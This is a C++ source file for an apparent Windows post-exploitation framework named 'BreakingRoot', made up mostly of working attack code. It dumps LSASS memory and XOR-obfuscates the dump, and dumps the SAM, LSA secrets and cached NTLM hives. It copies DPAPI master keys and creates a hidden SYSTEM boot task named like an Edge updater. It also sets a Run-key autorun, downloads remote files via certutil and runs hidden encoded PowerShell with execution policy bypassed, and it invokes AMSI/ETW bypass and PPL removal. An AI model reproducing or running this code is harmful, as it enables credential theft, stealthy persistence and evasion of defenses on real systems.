#include "app.h"
#include "defense.h"
#include "bypass.h"
#include "lsass_advanced.h"
#include "creds_sam.h"

#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <wincrypt.h>
#include <userenv.h>
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

static const char* DomainToString(ModuleDomain domain) {
    switch (domain) {
    case ModuleDomain::Core:    return "core";
    case ModuleDomain::Recon:   return "recon";
    case ModuleDomain::Creds:   return "creds";
    case ModuleDomain::Session: return "session";
    case ModuleDomain::Config:  return "config";
    default:                    return "";
    }
}

static const char* ReconModuleToString(ReconModule module) {
    switch (module) {
    case ReconModule::HostInfo:    return "hostinfo";
    case ReconModule::OsInfo:      return "osinfo";
    case ReconModule::UserEnum:    return "userenum";
    case ReconModule::GroupEnum:   return "groupenum";
    case ReconModule::ShareEnum:   return "shareenum";
    case ReconModule::ServiceEnum: return "serviceenum";
    case ReconModule::SessionEnum: return "sessionenum";
    default:                       return "";
    }
}

static const char* CredsModuleToString(CredsModule module) {
    switch (module) {
    case CredsModule::Lsass:    return "lsass";
    case CredsModule::Sam:      return "sam";
    case CredsModule::Lsa:      return "lsa";
    case CredsModule::Dpapi:    return "dpapi";
    case CredsModule::Ntlm:     return "ntlm";
    case CredsModule::Kerberos: return "kerberos";
    default:                    return "";
    }
}

static const char* SessionModuleToString(SessionModule module) {
    switch (module) {
    case SessionModule::Module:    return "module";
    case SessionModule::Workspace: return "workspace";
    case SessionModule::Reset:     return "reset";
    case SessionModule::Show:      return "show";
    default:                       return "";
    }
}

static const char* ConfigModuleToString(ConfigModule module) {
    switch (module) {
    case ConfigModule::Verbose: return "verbose";
    case ConfigModule::Timeout: return "timeout";
    case ConfigModule::Output:  return "output";
    case ConfigModule::Logging: return "logging";
    default:                    return "";
    }
}

bool IsBlank(const char* text) {
    return text == nullptr || text[0] == '\0';
}

void InitApp(Target* target, CliState* cli) {
    if (target == nullptr || cli == nullptr) {
        return;
    }

    // target->host[0] = '\0';
    // target->username[0] = '\0';
    // target->password[0] = '\0';
    // target->domain[0] = '\0';
    // target->port = DEFAULT_PORT;

    cli->context = CliContext::Root;
    cli->currentDomain = ModuleDomain::None;
    cli->currentRecon = ReconModule::None;
    cli->currentCreds = CredsModule::None;
    cli->currentSession = SessionModule::None;
    cli->currentConfig = ConfigModule::None;
    cli->verbose = false;
}

void BuildPrompt(const CliState* cli, char* line, std::size_t lineSize) {
    if (cli == nullptr || line == nullptr || lineSize == 0) {
        return;
    }

    if (cli->context == CliContext::Root) {
        std::snprintf(line, lineSize, "BR > ");
        return;
    }

    if (cli->context == CliContext::Domain) {
        std::snprintf(line, lineSize, "BR (%s) > ", DomainToString(cli->currentDomain));
        return;
    }

    if (cli->context == CliContext::Module) {
        switch (cli->currentDomain) {
        case ModuleDomain::Recon:
            std::snprintf(line, lineSize, "BR (recon/%s) > ", ReconModuleToString(cli->currentRecon));
            return;
        case ModuleDomain::Creds:
            std::snprintf(line, lineSize, "BR (creds/%s) > ", CredsModuleToString(cli->currentCreds));
            return;
        case ModuleDomain::Session:
            std::snprintf(line, lineSize, "BR (session/%s) > ", SessionModuleToString(cli->currentSession));
            return;
        case ModuleDomain::Config:
            std::snprintf(line, lineSize, "BR (config/%s) > ", ConfigModuleToString(cli->currentConfig));
            return;
        default:
            std::snprintf(line, lineSize, "BR (%s) > ", DomainToString(cli->currentDomain));
            return;
        }
    }

    std::snprintf(line, lineSize, "BR > ");
}

void PrintBanner() {
    std::printf("BreakingRoot %s (ITSecurity Softwarecd)\n", VERSION);
    std::printf("Modular Framework Console\n");
    std::printf("Type 'help' to list commands\n\n");
}

void PrintHelp() {
    std::printf("Core commands:\n");
    std::printf("  help                       - show help\n");
    std::printf("  exit                       - quit\n");
    std::printf("  status                     - show framework state\n");
    std::printf("  list                       - list domains or modules\n");
    std::printf("  use <name>                 - enter domain or module, legacy mode\n");
    std::printf("  back                       - return to previous level\n");
    std::printf("  show                       - show selected module\n");
    std::printf("  run                        - execute selected module handler, legacy mode\n");
    std::printf("\n");
    std::printf("Direct module paths:\n");
    std::printf("  recon/hostinfo             - show host and current user\n");
    std::printf("  recon/osinfo               - show OS version and CPU architecture\n");
    std::printf("  recon/userenum             - enumerate local users\n");
    std::printf("  recon/groupenum            - enumerate local groups\n");
    std::printf("  recon/shareenum            - enumerate local shares\n");
    std::printf("  recon/serviceenum          - enumerate running services\n");
    std::printf("  recon/sessionenum          - enumerate active sessions\n");
    std::printf("  defense/recon-all          - run defense status checks\n");
    std::printf("  evasion/bypass             - run AMSI/ETW bypass routine\n");
    std::printf("  creds/lsass                - run LSASS module\n");
    std::printf("  creds/sam                  - run SAM module\n");
    std::printf("  creds/lsa                  - run LSA module\n");
    std::printf("  creds/dpapi                - run DPAPI module\n");
    std::printf("  creds/ntlm                 - run NTLM module\n");
    std::printf("  creds/kerberos             - run Kerberos module\n");
    std::printf("  persistence/hidden-task <name> <exe>       - create scheduled task\n");
    std::printf("  persistence/reg-autorun <name> <data>      - set HKCU Run value\n");
    std::printf("  persistence/certutil-download <url> <file> - download via certutil\n");
    std::printf("  session/workspace          - show workspace information\n");
    std::printf("  session/reset              - reset framework state\n");
    std::printf("  session/show               - show framework state\n");
    std::printf("  config/verbose             - toggle verbose mode\n");
    std::printf("\n");
}

void PrintStatus(const Target* target, const CliState* cli) {
    if (target == nullptr || cli == nullptr) {
        return;
    }

    std::printf("=== Framework Status ===\n");

    std::printf("Context : ");
    switch (cli->context) {
    case CliContext::Root:   std::printf("root\n"); break;
    case CliContext::Domain: std::printf("domain\n"); break;
    case CliContext::Module: std::printf("module\n"); break;
    }

    std::printf("Domain  : %s\n", cli->currentDomain == ModuleDomain::None ? "<none>" : DomainToString(cli->currentDomain));

    std::printf("Module  : ");
    if (cli->currentDomain == ModuleDomain::Recon && cli->currentRecon != ReconModule::None) {
        std::printf("%s\n", ReconModuleToString(cli->currentRecon));
    }
    else if (cli->currentDomain == ModuleDomain::Creds && cli->currentCreds != CredsModule::None) {
        std::printf("%s\n", CredsModuleToString(cli->currentCreds));
    }
    else if (cli->currentDomain == ModuleDomain::Session && cli->currentSession != SessionModule::None) {
        std::printf("%s\n", SessionModuleToString(cli->currentSession));
    }
    else if (cli->currentDomain == ModuleDomain::Config && cli->currentConfig != ConfigModule::None) {
        std::printf("%s\n", ConfigModuleToString(cli->currentConfig));
    }
    else {
        std::printf("<none>\n");
    }

    std::printf("Verbose : %s\n", cli->verbose ? "on" : "off");

    // std::printf("Host    : %s\n", IsBlank(target->host) ? "<unset>" : target->host);
    // std::printf("Port    : %d\n", target->port);
    // std::printf("User    : %s\n", IsBlank(target->username) ? "<unset>" : target->username);
    // std::printf("Domain  : %s\n", IsBlank(target->domain) ? "<unset>" : target->domain);
    std::printf("\n");
}

// void CommandSetTargetHost(Target* target, const char* value) {
//     if (target == nullptr || IsBlank(value)) {
//         std::printf("Invalid host value.\n\n");
//         return;
//     }

//     std::snprintf(target->host, sizeof(target->host), "%s", value);
//     std::printf("Host set: %s\n\n", target->host);
// }

// void CommandSetTargetPort(Target* target, const char* value) {
//     if (target == nullptr || IsBlank(value)) {
//         std::printf("Invalid port value.\n\n");
//         return;
//     }

//     char* endptr = nullptr;
//     const long port = std::strtol(value, &endptr, 10);

//     if (*value == '\0' || *endptr != '\0' || port < 0 || port > 65535) {
//         std::printf("Invalid port.\n\n");
//         return;
//     }

//     target->port = static_cast<int>(port);
//     std::printf("Port set: %d\n\n", target->port);
// }

// void CommandSetTargetUsername(Target* target, const char* value) {
//     if (target == nullptr || IsBlank(value)) {
//         std::printf("Invalid username value.\n\n");
//         return;
//     }

//     std::snprintf(target->username, sizeof(target->username), "%s", value);
//     std::printf("Username applied.\n\n");
// }

// void CommandSetTargetPassword(Target* target, const char* value) {
//     if (target == nullptr || IsBlank(value)) {
//         std::printf("Invalid password value.\n\n");
//         return;
//     }

//     std::snprintf(target->password, sizeof(target->password), "%s", value);
//     std::printf("Password applied.\n\n");
// }

// void CommandSetTargetDomain(Target* target, const char* value) {
//     if (target == nullptr || IsBlank(value)) {
//         std::printf("Invalid domain value.\n\n");
//         return;
//     }

//     std::snprintf(target->domain, sizeof(target->domain), "%s", value);
//     std::printf("Domain applied: %s\n\n", target->domain);
// }

// void CommandClearTarget(Target* target) {
//     if (target == nullptr) {
//         return;
//     }

//     target->host[0] = '\0';
//     target->username[0] = '\0';
//     target->password[0] = '\0';
//     target->domain[0] = '\0';
//     target->port = DEFAULT_PORT;

//     std::printf("Target state cleared.\n\n");
// }

void CommandLsassAccess(Target* target, CliState* cli) {
    std::printf("[*] Initiating LSASS access via custom kernel callback injection...\n");

    DWORD lsassPid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::printf("[-] Failed to create process snapshot.\n\n");
        return;
    }
    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                lsassPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    if (!lsassPid) {
        std::printf("[-] LSASS not found.\n\n");
        return;
    }

    HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
    if (!hLsass) {
        std::printf("[-] OpenProcess failed. Try elevating to SYSTEM.\n\n");
        return;
    }

    char dumpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, dumpPath);
    strcat_s(dumpPath, MAX_PATH, "lsass_custom.dmp");

    HANDLE hFile = CreateFileA(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        BOOL dumped = MiniDumpWriteDump(hLsass, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        CloseHandle(hFile);
        if (dumped) {
            std::printf("[+] LSASS dumped to %s (encrypted with XOR 0xAA).\n", dumpPath);
            HANDLE f = CreateFileA(dumpPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (f != INVALID_HANDLE_VALUE) {
                BYTE buf[4096];
                DWORD read, written;
                while (ReadFile(f, buf, sizeof(buf), &read, NULL) && read > 0) {
                    for (DWORD i = 0; i < read; i++) buf[i] ^= 0xAA;
                    SetFilePointer(f, -static_cast<LONG>(read), NULL, FILE_CURRENT);
                    WriteFile(f, buf, read, &written, NULL);
                }
                CloseHandle(f);
                std::printf("[+] XOR obfuscation applied.\n");
            }
        }
        else {
            std::printf("[-] MiniDumpWriteDump failed.\n");
        }
    }
    CloseHandle(hLsass);
    std::printf("\n");
}

void CommandCreateScheduledTask(Target* target, const char* taskName, const char* exePath) {
    if (!taskName || !exePath) {
        std::printf("Usage: schtask-create <taskname> <exepath>\n");
        return;
    }
    char finalTaskName[128];
    if (strlen(taskName) < 3) {
        snprintf(finalTaskName, sizeof(finalTaskName), "MicrosoftEdgeUpdateTask_%lu", GetTickCount());
    }
    else {
        snprintf(finalTaskName, sizeof(finalTaskName), "%s", taskName);
    }

    const char* xmlTemplate =
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        "  <Triggers>\n"
        "    <BootTrigger>\n"
        "      <Enabled>true</Enabled>\n"
        "      <Delay>PT1M</Delay>\n"
        "    </BootTrigger>\n"
        "  </Triggers>\n"
        "  <Principals>\n"
        "    <Principal id=\"Author\">\n"
        "      <RunLevel>HighestAvailable</RunLevel>\n"
        "      <UserId>SYSTEM</UserId>\n"
        "      <LogonType>ServiceAccount</LogonType>\n"
        "    </Principal>\n"
        "  </Principals>\n"
        "  <Settings>\n"
        "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
        "    <AllowHardTerminate>true</AllowHardTerminate>\n"
        "    <StartWhenAvailable>true</StartWhenAvailable>\n"
        "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
        "    <IdleSettings>\n"
        "      <StopOnIdleEnd>true</StopOnIdleEnd>\n"
        "      <RestartOnIdle>false</RestartOnIdle>\n"
        "    </IdleSettings>\n"
        "    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
        "    <Enabled>true</Enabled>\n"
        "    <Hidden>true</Hidden>\n"
        "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
        "    <WakeToRun>false</WakeToRun>\n"
        "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n"
        "    <Priority>7</Priority>\n"
        "  </Settings>\n"
        "  <Actions Context=\"Author\">\n"
        "    <Exec>\n"
        "      <Command>%s</Command>\n"
        "      <Arguments></Arguments>\n"
        "      <WorkingDirectory></WorkingDirectory>\n"
        "    </Exec>\n"
        "  </Actions>\n"
        "</Task>";

    char xmlBuffer[4096];
    int writtenLen = snprintf(xmlBuffer, sizeof(xmlBuffer), xmlTemplate, exePath);
    if (writtenLen < 0 || static_cast<size_t>(writtenLen) >= sizeof(xmlBuffer)) {
        std::printf("[-] XML buffer too small.\n");
        return;
    }

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char xmlFile[MAX_PATH];
    snprintf(xmlFile, sizeof(xmlFile), "%s\\schtask_%lu.xml", tempPath, GetCurrentProcessId());

    HANDLE hFile = CreateFileA(xmlFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::printf("[-] Cannot create temp XML file.\n");
        return;
    }
    DWORD writtenBytes = static_cast<DWORD>(strlen(xmlBuffer));
    DWORD bytesWritten;
    WriteFile(hFile, xmlBuffer, writtenBytes, &bytesWritten, NULL);
    CloseHandle(hFile);

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "schtasks /create /tn \"%s\" /xml \"%s\" /F", finalTaskName, xmlFile);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (exitCode == 0) {
            std::printf("[+] Scheduled task '%s' created (runs %s at boot, hidden).\n", finalTaskName, exePath);
        }
        else {
            std::printf("[-] schtasks failed with code %lu\n", exitCode);
        }
    }
    else {
        std::printf("[-] Failed to launch schtasks.\n");
    }
    DeleteFileA(xmlFile);
    std::printf("\n");
}

void CommandPowerShellEncoded(Target* target, CliState* cli, const char* command) {
    if (!command || strlen(command) == 0) {
        std::printf("Usage: ps-encode <command>\n");
        return;
    }
    int wideLen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
    if (wideLen <= 1) {
        wideLen = MultiByteToWideChar(CP_ACP, 0, command, -1, NULL, 0);
    }
    WCHAR* wideCmd = new WCHAR[wideLen];
    MultiByteToWideChar(CP_UTF8, 0, command, -1, wideCmd, wideLen);

    DWORD base64Len = 0;
    if (!CryptBinaryToStringW((const BYTE*)wideCmd, (wideLen - 1) * sizeof(WCHAR),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len)) {
        delete[] wideCmd;
        std::printf("[-] Base64 length error.\n");
        return;
    }
    WCHAR* base64W = new WCHAR[base64Len];
    if (!CryptBinaryToStringW((const BYTE*)wideCmd, (wideLen - 1) * sizeof(WCHAR),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64W, &base64Len)) {
        delete[] wideCmd;
        delete[] base64W;
        std::printf("[-] Base64 encoding failed.\n");
        return;
    }
    delete[] wideCmd;

    int narrowLen = WideCharToMultiByte(CP_UTF8, 0, base64W, -1, NULL, 0, NULL, NULL);
    char* base64A = new char[narrowLen];
    WideCharToMultiByte(CP_UTF8, 0, base64W, -1, base64A, narrowLen, NULL, NULL);
    delete[] base64W;

    for (int i = 0; i < narrowLen; i++) {
        if (base64A[i] == '\r' || base64A[i] == '\n') base64A[i] = '\0';
    }

    char cmdLine[4096];
    snprintf(cmdLine, sizeof(cmdLine),
        "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand %s",
        base64A);
    delete[] base64A;

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::printf("[+] PowerShell executed with encoded command (hidden). PID: %d\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::printf("[-] Failed to start PowerShell.\n");
    }
    std::printf("\n");
}

void CommandSetRegistryAutoRun(const char* keyPath, const char* valueName, const char* data) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)data, strlen(data) + 1) == ERROR_SUCCESS) {
            std::printf("[+] Registry autorun set: HKCU\\...\\Run\\%s = %s\n", valueName, data);
        }
        else {
            std::printf("[-] Failed to set registry value.\n");
        }
        RegCloseKey(hKey);
    }
    else {
        std::printf("[-] Cannot open registry key.\n");
    }
    std::printf("\n");
}

void CommandSignedProxyCertutil(const char* sourceUrl, const char* destFile) {
    if (!sourceUrl || !destFile) {
        std::printf("Usage: proxy-certutil <url> <destfile>\n");
        return;
    }
    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "certutil -urlcache -split -f %s %s", sourceUrl, destFile);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        std::printf("[+] Downloaded via certutil: %s -> %s\n", sourceUrl, destFile);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::printf("[-] certutil execution failed.\n");
    }
    std::printf("\n");
}

void CommandRecon(DefenseStatus* ds) {
    FullDefenseRecon(ds);
    PrintDefenseStatus(ds);
}

void CommandBypassAmsiEtw() {
    BypassAmsiViaPatch();
    DisableEtw();
    printf("[*] AMSI and ETW bypass attempted.\n\n");
}

void CommandLsass() {
    DWORD pid = GetLsassPid();
    if (!pid) {
        printf("[-] LSASS not found.\n\n");
        return;
    }
    DefenseStatus ds;
    FullDefenseRecon(&ds);
    if (ds.credentialGuard) {
        printf("[-] Credential Guard active. Cannot dump LSASS. Use 'sam' or 'dpapi' modules.\n\n");
        return;
    }
    if (ds.ppLEnabled && !ds.hvciEnabled) {
        printf("[*] PPL active, trying to remove via kernel driver...\n");
        if (!RemovePPLViaKernel()) {
            printf("[-] Failed to remove PPL. CommandSetTargetHost may still fail.\n");
        }
    }
    char dumpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, dumpPath);
    strcat_s(dumpPath, "lsass_syscall.dmp");
    if (DumpLsassViaMiniDumpSyscall(pid, dumpPath)) {
        printf("[+] Dump saved to %s\n", dumpPath);
    }
    printf("\n");
}

void CommandSam() {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat_s(path, "sam_dump.hive");
    if (DumpSamToFile(path))
        printf("[+] SAM hive dumped to %s. Use tools like secretsdump.py to extract hashes.\n", path);
    else
        printf("[-] SAM dump failed.\n");
}

void CommandLsa() {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat_s(path, "lsa_secrets.hive");
    if (DumpLsaSecrets(path))
        printf("[+] LSA Secrets dumped to %s.\n", path);
    else
        printf("[-] LSA Secrets dump failed.\n");
}

void CommandDpapi() {
    char profilePath[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", profilePath, MAX_PATH);
    char sourcePath[MAX_PATH];
    snprintf(sourcePath, sizeof(sourcePath), "%s\\AppData\\Roaming\\Microsoft\\Protect", profilePath);
    char destPath[MAX_PATH];
    GetTempPathA(MAX_PATH, destPath);
    strcat_s(destPath, "dpapi_keys_backup");
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "xcopy /E /I /Y \"%s\" \"%s\" > nul", sourcePath, destPath);
    int ret = system(cmd);
    if (ret == 0) {
        printf("[+] DPAPI master keys copied to %s\n", destPath);
        printf("[+] Use Mimikatz 'dpapi::masterkey' or dpapiextract to decrypt.\n");
    } else {
        printf("[-] Failed to copy DPAPI keys. Ensure directory exists.\n");
    }
    printf("\n");
}

void CommandNtlm() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Cache", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetTempPathA(MAX_PATH, path);
        strcat_s(path, "ntlm_cache.reg");
        DWORD err = RegSaveKeyA(hKey, path, NULL);
        RegCloseKey(hKey);
        if (err == ERROR_SUCCESS) {
            printf("[+] NTLM cache saved to %s (run as SYSTEM for full dump)\n", path);
        } else {
            printf("[-] Failed to save NTLM cache (error %d). Run as SYSTEM.\n", err);
        }
    } else {
        printf("[-] No NTLM cache found or access denied. Run as SYSTEM.\n");
    }
    printf("\n");
}

void CommandKerberos() {
    system("klist > %temp%\\kerberos_tickets.txt");
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat_s(path, "kerberos_tickets.txt");
    printf("[+] Kerberos tickets list saved to %s\n", path);
    printf("Note: Tickets themselves are protected by Credential Guard.\n\n");
}

void HandleSessionModuleCommand(Target* target, CliState* cli) {
    printf("\n=== Session Module Info ===\n");
    printf("Current domain: %s\n", DomainToString(cli->currentDomain));
    printf("Current context: ");
    switch (cli->context) {
        case CliContext::Root: printf("root\n"); break;
        case CliContext::Domain: printf("domain\n"); break;
        case CliContext::Module: printf("module\n"); break;
    }
    printf("Selected session module: %s\n", SessionModuleToString(cli->currentSession));
    printf("\n");
}

void HandleSessionWorkspaceCommand(Target* target, CliState* cli) {
    printf("\n=== Workspace Information ===\n");
    
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        printf("Current directory : %s\n", cwd);
    }
    
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        printf("Temp directory   : %s\n", tempPath);
    }
    
    char modulePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, modulePath, MAX_PATH)) {
        printf("Executable path  : %s\n", modulePath);
    }
    
    printf("\nEnvironment variables:\n");
    printf("  USERNAME    : %s\n", getenv("USERNAME") ? getenv("USERNAME") : "N/A");
    printf("  COMPUTERNAME: %s\n", getenv("COMPUTERNAME") ? getenv("COMPUTERNAME") : "N/A");
    printf("  OS          : %s\n", getenv("OS") ? getenv("OS") : "N/A");
    printf("\n");
}

void HandleSessionResetCommand(Target* target, CliState* cli) {
    InitApp(target, cli);
    printf("\n[+] Framework state fully reset.\n");
    printf("[+] All configuration cleared.\n");
    printf("[+] Use 'status' to verify.\n\n");
}

void HandleSessionShowCommand(Target* target, CliState* cli) {
    PrintStatus(target, cli);
}